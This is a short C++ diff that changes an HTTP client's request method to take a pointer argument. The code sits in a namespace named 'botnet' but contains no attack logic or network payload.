@@ -10,7 +10,7 @@ namespace botnet {
             http_client(std::string url) : _url(url)
             {}
 
-            bool request(http_request req);
+            bool request(http_request *req);
             std::string getContent() const {
                 return _code;
             }
